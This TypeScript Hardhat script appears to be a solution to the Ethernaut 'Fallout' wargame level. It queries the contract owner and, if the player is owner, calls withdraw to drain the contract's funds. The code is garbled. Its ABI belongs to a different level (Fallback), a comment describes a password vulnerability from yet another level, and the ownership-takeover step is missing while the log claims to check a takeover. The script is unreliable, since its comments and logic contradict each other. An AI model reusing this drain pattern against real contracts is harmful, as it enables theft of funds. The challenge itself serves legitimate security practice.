import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackFallout = async () => {
    // change contract addresses here.
    const falloutAddress = "0x25d44eB1C5F7Ea6d32B11c7a28A5dBB9251f3417"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here

    // Don't touch below 🚀
    // Vulnerability from public view of password
    // additional read:
    // https://web3js.readthedocs.io/en/v1.5.2/web3-utils.html#towei
    // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            stateMutability: "nonpayable",
            type: "constructor",
            constant: undefined,
            payable: undefined,
        },
        {
            inputs: [],
            name: "contribute",
            outputs: [],
            payable: true,
            stateMutability: "payable",
            type: "function",
        },
        {
            inputs: [{ internalType: "address", name: "", type: "address" }],
            name: "contributions",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "getContribution",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "withdraw",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            constant: true,
            name: "infoNum",
            payable: true,
            stateMutability: "payable",
            type: "receive",
        },
    ];
    const contract = await ethers.getContractAt(ABI, falloutAddress);
    const ownerAddress = await contract.owner();
    console.log(`Contract Owner is: ${ownerAddress}`);

    console.log("Checking that player is now owner...");
    const newOwner = await contract.owner();
    console.log(`Contract Owner is now: ${newOwner}`);
    const owner = newOwner === player;
    console.log(`Player is now owner: ${owner}`);
    if (owner) {
        console.log("Draining contract by withdrawing as owner...");
        const withdraw = await contract.withdraw();
        const Receipt = await withdraw.wait(1);
        console.log(Receipt);
        console.log("Done...submit in ethernaut");
    } else {
        console.log("Player is not owner, please review code above");
    }
};

attackFallout()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
